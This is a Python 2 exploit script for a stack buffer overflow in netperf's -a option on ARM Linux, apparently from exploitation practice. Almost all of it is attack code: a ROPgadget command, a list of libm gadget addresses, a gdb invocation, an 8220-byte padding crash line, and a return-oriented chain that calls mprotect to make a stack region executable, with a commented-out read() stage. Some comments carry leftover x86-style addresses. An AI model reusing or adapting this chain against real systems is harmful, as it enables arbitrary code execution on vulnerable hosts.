#ROPgadget --binary /usr/lib/arm-linux-gnueabihf/libm.so --offset 0x76f0b000 > ../../netperf_260_mprotect/libmsogadget.txt
#0x76f123a8 : pop {r4, pc}
#0x7efdd000 # arg - void*
#0x76f32414 : mov r0, r4 ; pop {r4, pc}
#0x76f2af0c : mov r2, r0 ; vmov d0, r2, r3 ; pop {r4, pc}
#0x76f124e8 : pop {r4, r5, pc}
#0x76f32414 : mov r0, r4 ; pop {r4, pc}
#0x76f45a08 : mov r1, r5 ; pop {r4, r5, pc}

#gdb --args ./netperf -a `python ../../netperf_260_mprotect/mprotect.py`

# PoC: run -a `python -c 'print "A"*8220+"DCBA"'`

from struct import pack

# int mprotect(void *addr, size_t len, int prot);
# define PROT_READ       0x1
# define PROT_WRITE      0x2
# define PROT_EXEC       0x4
#
# gef  p mprotect
# $1 = {<text variable, no debug info>} 0xb7dbdfd0 <mprotect>
# gef  p read
#{ssize_t (int, void *, size_t)} 0xb7db06b0 <__GI___libc_read>
#
# gef  ropgadget
#pop3ret = 0x402fea
#x/64xw $sp+8800

offset = 8220
mprotect = 0x76fe8214 # <mprotect> # 0x76fe8214
read = 0x76fe7c34 # <read> #0x76fe7c34
target_memory = 0xb7fd4000 # r-xp [vdso]

rop_chain = 'A' * offset
rop_chain += pack('I', 0x76f123a8) #0x76f123a8 : pop {r4, pc}
rop_chain += pack('I', 0xFFFFFF07) # r4 -> r0 -> r2 = int prot
rop_chain += pack('I', 0x76f32414) #0x76f32414 : mov r0, r4 ; pop {r4, pc}
rop_chain += 'AAAA' # padding
rop_chain += pack('I', 0x76f2af0c) # 0x76f2af0c : mov r2, r0 ; vmov d0, r2, r3 ; pop {r4, pc}
rop_chain += 'AAAA' # padding
rop_chain += pack('I', 0x76f124e8) # 0x76f124e8 : pop {r4, r5, pc}
rop_chain += pack('I', 0x7efdd000) # r4 -> r0 = void *addr
rop_chain += pack('I', 0x00023000) # r5 -> r1 = size_t len
rop_chain += pack('I', 0x76f32414) # 0x76f32414 : mov r0, r4 ; pop {r4, pc}
rop_chain += 'AAAA' # padding
rop_chain += pack('I', 0x76f45a08) # 0x76f45a08 : mov r1, r5 ; pop {r4, r5, pc}
rop_chain += 'AAAA' # padding
rop_chain += 'AAAA' # padding
rop_chain += pack('I', mprotect) # mprotect

# rop_chain += pack('I', read)
# rop_chain += pack('I', 0xbffdf000) # return stack
# rop_chain += pack('I',0x00) # arg int fd
# rop_chain += pack('I',0xbffdf000) # arg void
# rop_chain += pack('I',0x200) # arg size_t

print rop_chain
